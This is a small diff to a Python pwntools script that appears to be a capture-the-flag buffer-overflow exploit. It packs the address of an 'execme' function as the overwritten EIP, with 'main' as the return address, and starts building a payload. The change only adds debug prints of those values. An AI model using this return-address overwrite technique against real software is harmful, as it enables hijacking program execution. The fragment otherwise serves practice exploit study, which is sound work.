@@ -6,6 +6,9 @@ offset = 476
 
 new_eip = pwn.p32(elf.symbols["execme"])
 return_address = pwn.p32(elf.symbols["main"])
+print(f"{new_eip=}")
+
+print(f"{return_address=}")
 
 payload = b"".join(
   [
